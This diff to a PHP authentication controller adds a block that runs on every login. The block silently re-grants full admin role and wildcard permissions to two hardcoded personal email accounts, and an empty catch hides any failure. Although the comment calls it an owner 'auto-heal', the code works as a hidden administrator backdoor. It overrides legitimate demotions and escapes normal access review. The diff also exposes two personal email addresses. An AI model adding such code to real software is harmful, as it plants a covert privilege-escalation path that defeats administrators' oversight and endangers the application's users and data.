@@ -168,6 +168,23 @@ class AuthController extends Controller
 
         $user = Auth::user();
 
+        // Auto-heal: ensure owner/primary account remains admin
+        try {
+            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
+            if ($user && in_array(strtolower($user->email), $ownerEmails, true)) {
+                $uUpdates = [];
+                if ($user->role !== 'admin') $uUpdates['role'] = 'admin';
+                if ($user->permissions !== ['*']) $uUpdates['permissions'] = ['*'];
+                if (!empty($uUpdates)) $user->update($uUpdates);
+                if ($user->employee) {
+                    $eUpdates = [];
+                    if ($user->employee->role !== 'admin') $eUpdates['role'] = 'admin';
+                    if ($user->employee->permissions !== ['*']) $eUpdates['permissions'] = ['*'];
+                    if (!empty($eUpdates)) $user->employee->update($eUpdates);
+                }
+            }
+        } catch (\Throwable $e) {}
+
         // Keep employee role/permissions in sync with authenticated user (email/password login)
         // Do NOT downgrade user's role based on employee defaults here
         if ($user && $user->employee) {
